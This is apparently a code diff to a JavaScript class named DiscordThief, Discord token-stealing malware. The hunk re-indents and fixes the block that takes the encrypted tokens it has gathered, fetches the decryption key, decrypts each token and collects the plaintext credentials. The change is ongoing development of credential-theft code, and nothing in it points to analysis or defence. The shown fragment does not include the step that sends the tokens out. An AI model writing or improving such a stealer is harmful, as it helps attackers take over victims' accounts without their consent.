@@ -49,23 +49,23 @@ export class DiscordThief {
                     encryptedTokens.push(matches[0])
                 }
             }
+        }
 
-            if (encryptedTokens.length > 0) {
-                const encryptionKey = await this.getEncryptionKey()
+        if (encryptedTokens.length > 0) {
+            const encryptionKey = await this.getEncryptionKey()
 
-                for (const encryptedToken of encryptedTokens) {
-                    let token = await this.decryptToken(
-                        encryptedToken,
-                        encryptionKey
-                    )
+            for (const encryptedToken of encryptedTokens) {
+                let token = await this.decryptToken(
+                    encryptedToken,
+                    encryptionKey
+                )
 
-                    if (token.endsWith('\\')) {
-                        token = token.replace('\\', '')
-                    }
+                if (token.endsWith('\\')) {
+                    token = token.replace('\\', '')
+                }
 
-                    if (token) {
-                        tokens.push(token)
-                    }
+                if (token) {
+                    tokens.push(token)
                 }
             }
         }
